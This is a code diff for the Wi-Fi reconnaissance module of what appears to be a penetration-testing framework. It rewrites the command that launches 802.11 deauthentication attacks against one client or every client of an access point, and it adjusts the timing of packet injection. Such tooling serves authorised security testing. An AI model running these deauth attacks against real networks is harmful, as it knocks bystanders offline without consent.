@@ -1,7 +1,6 @@
 package modules
 
 import (
-	"errors"
 	"fmt"
 	"net"
 	"os"
@@ -29,18 +28,16 @@ var maxStationTTL = 5 * time.Minute
 type WiFiRecon struct {
 	session.SessionModule
 
-	handle      *pcap.Handle
-	channel     int
-	client      net.HardwareAddr
-	accessPoint net.HardwareAddr
+	handle  *pcap.Handle
+	channel int
+	apBSSID net.HardwareAddr
 }
 
 func NewWiFiRecon(s *session.Session) *WiFiRecon {
 	w := &WiFiRecon{
 		SessionModule: session.NewSessionModule("wifi.recon", s),
 		channel:       0,
-		client:        make([]byte, 0),
-		accessPoint:   make([]byte, 0),
+		apBSSID:       nil,
 	}
 
 	w.AddHandler(session.NewModuleHandler("wifi.recon on", "",
@@ -55,42 +52,44 @@ func NewWiFiRecon(s *session.Session) *WiFiRecon {
 			return w.Stop()
 		}))
 
-	w.AddHandler(session.NewModuleHandler("wifi.deauth", "",
-		"Start a 802.11 deauth attack (use ticker to iterate the attack).",
-		func(args []string) error {
-			return w.startDeauth()
-		}))
-
-	w.AddHandler(session.NewModuleHandler("wifi.recon set client MAC", "wifi.recon set client ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
-		"Set client to deauth (single target).",
-		func(args []string) error {
-			var err error
-			w.client, err = net.ParseMAC(args[0])
-			return err
-		}))
-
-	w.AddHandler(session.NewModuleHandler("wifi.recon clear client", "",
-		"Remove client to deauth.",
-		func(args []string) error {
-			w.client = make([]byte, 0)
-			return nil
-		}))
-
-	w.AddHandler(session.NewModuleHandler("wifi.recon set bs MAC", "wifi.recon set bs ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
+	w.AddHandler(session.NewModuleHandler("wifi.recon MAC", "wifi.recon ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
 		"Set 802.11 base station address to filter for.",
 		func(args []string) error {
 			var err error
 			w.Session.WiFi.Clear()
-			w.accessPoint, err = net.ParseMAC(args[0])
+			w.apBSSID, err = net.ParseMAC(args[0])
 			return err
 		}))
 
-	w.AddHandler(session.NewModuleHandler("wifi.recon clear bs", "",
+	w.AddHandler(session.NewModuleHandler("wifi.recon clear", "",
 		"Remove the 802.11 base station filter.",
 		func(args []string) error {
 			w.Session.WiFi.Clear()
-			w.accessPoint = make([]byte, 0)
+			w.apBSSID = nil
 			return nil
+		}))
+
+	w.AddHandler(session.NewModuleHandler("wifi.deauth AP-BSSID TARGET-BSSID", `wifi\.deauth ([a-fA-F0-9\s:]+)`,
+		"Start a 802.11 deauth attack, while the AP-BSSID is mandatory, if no TARGET-BSSID is specified the deauth will be executed against every connected client.",
+		func(args []string) error {
+			err := (error)(nil)
+			apMac := (net.HardwareAddr)(nil)
+			clMac := (net.HardwareAddr)(nil)
+			parts := strings.SplitN(args[0], " ", 2)
+
+			if len(parts) == 2 {
+				if apMac, err = net.ParseMAC(parts[0]); err != nil {
+					return err
+				} else if clMac, err = net.ParseMAC(parts[1]); err != nil {
+					return err
+				}
+			} else {
+				if apMac, err = net.ParseMAC(parts[0]); err != nil {
+					return err
+				}
+			}
+
+			return w.startDeauth(apMac, clMac)
 		}))
 
 	w.AddHandler(session.NewModuleHandler("wifi.show", "",
@@ -196,11 +195,7 @@ func (w *WiFiRecon) showTable(header []string, rows [][]string) {
 }
 
 func (w *WiFiRecon) isApSelected() bool {
-	return len(w.accessPoint) > 0
-}
-
-func (w *WiFiRecon) isClientSelected() bool {
-	return len(w.client) > 0
+	return w.apBSSID != nil
 }
 
 func (w *WiFiRecon) Show(by string) error {
@@ -227,9 +222,9 @@ func (w *WiFiRecon) Show(by string) error {
 		columns = []string{"RSSI", "MAC", "Vendor", "Channel", "Sent", "Received", "Last Seen"}
 
 		if nrows == 0 {
-			fmt.Printf("\nNo authenticated clients detected for %s.\n", w.accessPoint.String())
+			fmt.Printf("\nNo authenticated clients detected for %s.\n", w.apBSSID.String())
 		} else {
-			fmt.Printf("\n%s clients:\n", w.accessPoint.String())
+			fmt.Printf("\n%s clients:\n", w.apBSSID.String())
 		}
 	}
 
@@ -284,7 +279,7 @@ func (w *WiFiRecon) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAdd
 			log.Error("Could not send deauth packet: %s", err)
 			continue
 		} else {
-			time.Sleep(2 * time.Millisecond)
+			time.Sleep(10 * time.Millisecond)
 		}
 
 		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
@@ -294,16 +289,12 @@ func (w *WiFiRecon) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAdd
 			log.Error("Could not send deauth packet: %s", err)
 			continue
 		} else {
-			time.Sleep(2 * time.Millisecond)
+			time.Sleep(10 * time.Millisecond)
 		}
 	}
 }
 
-func (w *WiFiRecon) startDeauth() error {
-	// at least we need to know what ap we're talking about
-	if w.isApSelected() == false {
-		return errors.New("No access point selected, use 'wifi.recon set bs BSSID' to select one.")
-	}
+func (w *WiFiRecon) startDeauth(apMac net.HardwareAddr, clMac net.HardwareAddr) error {
 	// if not already running, temporarily enable the pcap handle
 	// for packet injection
 	if w.Running() == false {
@@ -314,22 +305,16 @@ func (w *WiFiRecon) startDeauth() error {
 	}
 
 	// deauth a specific client
-	if w.isClientSelected() {
-		w.sendDeauthPacket(w.accessPoint, w.client)
-		log.Info("Deauth packets sent for client station %s.", w.client.String())
+	if clMac != nil {
+		log.Info("Deauthing client %s from AP %s ...", clMac.String(), apMac.String())
+		w.sendDeauthPacket(apMac, clMac)
 	} else {
+		log.Info("Deauthing clients from AP %s ...", apMac.String())
 		// deauth every authenticated client
 		for _, station := range w.Session.WiFi.Stations {
-			w.sendDeauthPacket(w.accessPoint, station.HW)
-		}
-
-		n := len(w.Session.WiFi.Stations)
-		if n == 0 {
-			log.Warning("No associated clients detected yet, deauth packets not sent.")
-		} else if n == 1 {
-			log.Info("Deauth packets sent for 1 client station.")
-		} else {
-			log.Info("Deauth packets sent for %d client stations.", n)
+			if station.IsAP == false {
+				w.sendDeauthPacket(apMac, station.HW)
+			}
 		}
 	}
 
@@ -440,7 +425,7 @@ func (w *WiFiRecon) Start() error {
 					w.discoverAccessPoints(radiotap, dot11, packet)
 				} else {
 					// discover stations connected to the selected access point bssid
-					w.discoverClients(radiotap, dot11, w.accessPoint, packet)
+					w.discoverClients(radiotap, dot11, w.apBSSID, packet)
 				}
 			}
 		}
